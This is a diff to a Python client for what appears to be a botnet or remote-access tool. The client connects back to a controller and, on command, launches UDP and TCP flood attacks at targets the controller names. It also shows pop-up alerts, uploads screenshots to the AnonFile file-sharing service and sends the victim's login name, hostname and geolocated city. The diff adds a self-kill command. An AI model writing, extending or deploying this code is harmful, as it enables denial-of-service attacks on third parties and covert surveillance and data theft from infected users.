@@ -1,8 +1,9 @@
+from ctypes import WinError
 import socket, random, time, threading, os, pyautogui, geocoder, urllib, json, platform, cv2, winshell, win32com.client
 from turtle import title
 from anonfile import AnonFile
 ########## SETTINGS ########## 
-ip = ""
+ip = "127.0.0.1"
 port = 8080
 ########## SETTINGS ##########
 def connect():
@@ -12,8 +13,8 @@ def connect():
   client.connect((ip, port))
  except:
         return connect()
-        
-connect()            
+   
+connect()        
 def udp():
         ddata = random._urandom(1024)   
         udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
@@ -115,6 +116,7 @@ while True:
           title = str(client.recv(1024), 'utf-8')
           message = str(client.recv(1024), 'utf-8')
           pyautogui.alert(title=title, text=message)
+          
         elif data == 'tcp':
            tcpip = str(client.recv(1024), 'utf-8')
            tcpport = str(client.recv(1024), 'utf-8')
@@ -122,7 +124,11 @@ while True:
            sec = time.time()
            while time.time()<=sec+int(dur):        
              threading.Thread(target = tcp).start()   
-
+ 
+        elif data == 'kill':
+          filen = os.path.basename(__file__)
+          filen = filen.replace('py', 'exe')
+          os.system(f'Taskkill /IM {filen} /F ')
         elif data == 'screen':
             anon = AnonFile()
             try:
@@ -144,8 +150,8 @@ while True:
                 client.send(str.encode(os.getlogin()))     
                 client.send(str.encode(socket.gethostname()))   
                 g = geocoder.ip('me')
-                client.send(str.encode(g.city))   
+                client.send(str.encode(g.city)) 
               except:
                 pass  
-      except ConnectionResetError:                
+      except Exception as e:
         connect()
